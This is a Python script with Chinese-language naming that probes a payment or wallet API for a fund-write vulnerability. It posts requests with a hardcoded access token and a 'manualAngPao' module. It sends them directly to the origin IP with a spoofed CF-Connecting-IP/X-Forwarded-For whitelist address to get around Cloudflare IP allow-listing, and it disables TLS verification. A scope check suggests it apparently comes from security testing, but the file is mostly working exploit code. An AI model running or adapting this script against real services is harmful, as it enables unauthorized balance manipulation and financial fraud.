#!/usr/bin/env python3
"""硬编码系统令牌 + CF-Connecting-IP 资金写入探针。

对齐：传承/和稀泥·加款.md

示例:
  python3 炼蛊房/hardcoded_token_cfip.py probe \\
    --origin-ip 1.2.3.4 --host api.example.com \\
    --token \"$ARSYSTEMTOKEN\" --module /users/manualAngPao \\
    --cf-ip 54.x.x.x --case <案卷> --insecure
"""
from __future__ import annotations

import argparse
import json
import ssl
import sys
import urllib.error
import urllib.parse
import urllib.request
from datetime import datetime, UTC
from pathlib import Path
from typing import Any

OPS = Path(__file__).resolve().parent
ENGINE = (OPS.parent if (OPS.parent / "杀招").is_dir() else (OPS.parent if (OPS.parent / "杀招").is_dir() else OPS.parents[1]))
if str(OPS) not in sys.path:
    sys.path.insert(0, str(OPS))

from scope_lib import in_scope  # noqa: E402

UA = "Mozilla/5.0 大爱仙尊-hardcoded_token_cfip"



def _ssl_ctx():
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    return ctx


def _now() -> str:
    return datetime.now(UTC).strftime("%Y-%m-%dT%H:%M:%SZ")


def case_dir(case: str) -> Path:
    d = ENGINE / "案卷" / case / "测绘" / "hardcoded_cfip"
    d.mkdir(parents=True, exist_ok=True)
    return d


def ensure_scope_host(h: str) -> None:
    if h in ("127.0.0.1", "localhost", "::1"):
        return
    if not in_scope(h):
        raise SystemExit(f"[scope] refuse out-of-scope host: {h}")


def http_post(
    url: str,
    *,
    fields: dict[str, Any],
    headers: dict[str, str],
    insecure: bool,
    timeout: float = 25.0,
) -> dict[str, Any]:
    data = urllib.parse.urlencode({k: str(v) for k, v in fields.items()}).encode()
    hdrs = {"User-Agent": UA, "Content-Type": "application/x-www-form-urlencoded", **headers}
    req = urllib.request.Request(url, data=data, headers=hdrs, method="POST")
    ctx = ssl._create_unverified_context() if insecure else ssl.create_default_context()
    try:
        with urllib.request.urlopen(req, timeout=timeout, context=ctx) as resp:
            raw = resp.read().decode("utf-8", errors="replace")
            code = resp.status
    except urllib.error.HTTPError as e:
        raw = e.read().decode("utf-8", errors="replace")
        code = e.code
    except Exception as e:  # noqa: BLE001
        return {"status": 0, "raw": str(e), "error": type(e).__name__}
    try:
        parsed = json.loads(raw)
    except json.JSONDecodeError:
        parsed = None
    return {"status": code, "raw": raw[:2000], "json": parsed}


def cmd_probe(args: argparse.Namespace) -> int:
    ensure_scope_host(args.host)
    out = case_dir(args.case)
    extra: dict[str, Any] = {}
    if args.extra_json:
        extra = json.loads(args.extra_json)

    fields = {
        "accessToken": args.token,
        "module": args.module,
        **extra,
    }
    path = args.path if args.path.startswith("/") else f"/{args.path}"

    rows: list[dict[str, Any]] = []

    # A: via CDN / normal host (expect fail if edge strips header)
    if not args.skip_cdn:
        url_cdn = f"{args.scheme}://{args.host}{path}"
        r = http_post(
            url_cdn,
            fields=fields,
            headers={"CF-Connecting-IP": args.cf_ip, "Host": args.host},
            insecure=args.insecure,
        )
        rows.append({"mode": "via_host_cdn", "url": url_cdn, **r})
        print(f"[via_host] HTTP {r.get('status')} {str(r.get('raw', ''))[:160]}")

    # B: direct origin + Host + CF-Connecting-IP
    url_origin = f"{args.scheme}://{args.origin_ip}{path}"
    r2 = http_post(
        url_origin,
        fields=fields,
        headers={
            "Host": args.host,
            "CF-Connecting-IP": args.cf_ip,
            "X-Forwarded-For": args.cf_ip,
        },
        insecure=args.insecure,
    )
    rows.append({"mode": "direct_origin_spoof_cfip", "url": url_origin, **r2})
    print(f"[origin+cfip] HTTP {r2.get('status')} {str(r2.get('raw', ''))[:160]}")

    # C: direct origin without spoof (control)
    r3 = http_post(
        url_origin,
        fields=fields,
        headers={"Host": args.host},
        insecure=args.insecure,
    )
    rows.append({"mode": "direct_origin_nospoof", "url": url_origin, **r3})
    print(f"[origin-nospoof] HTTP {r3.get('status')} {str(r3.get('raw', ''))[:160]}")

    def okish(row: dict[str, Any]) -> bool:
        if row.get("status", 0) >= 400 or row.get("status") == 0:
            return False
        raw = (row.get("raw") or "").lower()
        if any(x in raw for x in ("forbidden", "deny", "ip", "unauthorized", "无效", "拒绝", "白名单")):
            # still might be soft fail — leave hint only
            pass
        return True

    report = {
        "checked_at": _now(),
        "host": args.host,
        "origin_ip": args.origin_ip,
        "cf_ip": args.cf_ip,
        "module": args.module,
        "path": path,
        "token_redacted": args.token[:4] + "…redacted" if args.token else None,
        "l1_origin_spoof_differs": (r2.get("status") != r3.get("status"))
        or ((r2.get("raw") or "")[:200] != (r3.get("raw") or "")[:200]),
        "l1_spoof_http_ok": okish(r2),
        "note": "L3 requires wallet balance delta on controlled test user — not inferred here.",
        "rows": rows,
    }
    p = out / "probe.json"
    p.write_text(json.dumps(report, ensure_ascii=False, indent=2) + "\n", encoding="utf-8")
    try:
        p.chmod(0o600)
    except OSError:
        pass
    print(f"[write] {p}")
    print(f"[verdict] spoof_http_ok={report['l1_spoof_http_ok']} differs_nospoof={report['l1_origin_spoof_differs']}")
    return 0


def main() -> int:
    p = argparse.ArgumentParser(description="Hardcoded token + CF-IP fund write probe")
    sub = p.add_subparsers(dest="cmd", required=True)
    sp = sub.add_parser("probe")
    sp.add_argument("--origin-ip", required=True)
    sp.add_argument("--host", required=True, help="business Host header / CDN hostname")
    sp.add_argument("--token", required=True, help="site-specific ARSYSTEMTOKEN/accessToken")
    sp.add_argument("--module", default="/users/manualAngPao")
    sp.add_argument("--cf-ip", required=True, help="spoofed whitelist IP")
    sp.add_argument("--case", required=True)
    sp.add_argument("--path", default="/api/v1/index.php")
    sp.add_argument("--scheme", default="https", choices=("https", "http"))
    sp.add_argument("--extra-json", default="")
    sp.add_argument("--skip-cdn", action="store_true")
    sp.add_argument("--insecure", action="store_true")
    sp.set_defaults(func=cmd_probe)
    args = p.parse_args()
    return int(args.func(args) or 0)


if __name__ == "__main__":
    raise SystemExit(main())
